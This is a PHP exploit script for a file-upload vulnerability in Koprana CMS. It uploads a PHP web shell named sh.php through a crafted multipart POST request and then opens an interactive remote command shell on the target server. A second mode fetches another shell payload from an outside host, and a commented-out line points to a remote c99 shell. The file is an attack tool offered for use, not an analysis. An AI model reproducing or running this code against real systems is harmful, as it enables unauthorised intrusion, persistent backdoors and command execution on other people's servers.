<?php
/*
!koprana_upload
@ HOST = localhost = Target URL
@ PATH = / = Web site path
@ MODE = 1 = Exploiting Mode 
 */
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}

print "\n+---------------------------------------------------------------+";
print "\n| Koprana CMS Exploit Upload Vulnerabilities By Soka            |";
print "\n|                                Recoded by The UnKn0wN         |";
print "\n| Mode 1: reverse shell connexion                               |";
print "\n| Mode 2: upload php shell                                      |";
print "\n+---------------------------------------------------------------+\n";
 
if ($argc < 3)
{
    print "\nUsage......: php $argv[0] <host> <path> <mode>\n";
    print "\nExample....: php $argv[0] localhost / 1";
    print "\nExample....: php $argv[0] localhost /site/ 2\n";
    die();
}

$host = $argv[1];
$path = $argv[2];
$mode = $argv[3];

$shell = "<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
//$shell2 = "<?php include('http://www.aresparadize.exano.net/Site/c99.php');";

$shell2 = file_get_contents("http://dofus-exploit.com/exploit/ibiza.txt");

if($mode == "2") $shell = $shell2;

$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"fichier\"; filename=\"sh.php\"\r\n";
$payload .= "Content-Type: application/x-php\r\n\r\n";
$payload .= "".$shell."\n\r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"execute\"\r\n\r\nexecute\r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"dossier\"\r\n\r\n./\r\n";
$payload .= "--{$boundary}--\r\n";




$packet  = "POST {$path}index.php?pages=buy1_ontrue HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary={$boundary}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: keep-alive\r\n\r\n{$payload}";

http_send($host, $packet);
if($mode == "1") {

$packet  = "GET {$path}sh.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Cmd: %s\r\n";
$packet .= "Connection: close\r\n\r\n";

if (!($sock = http_send($host, $packet))) die("\n[-] Upload failed!\n");
print "[+]Backdoor was upload!\n[+]Getting the shell...\n"; 
while(1)
{
    print "\n{$host}@shell# ";
    if (($cmd = trim(fgets(STDIN))) == "exit") break;
    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
    print $m[1] : die("\n[-] Exploit failed!\n");
}
}else
	print "Go to {$host}{$path}sh.php to check.\n";

?>
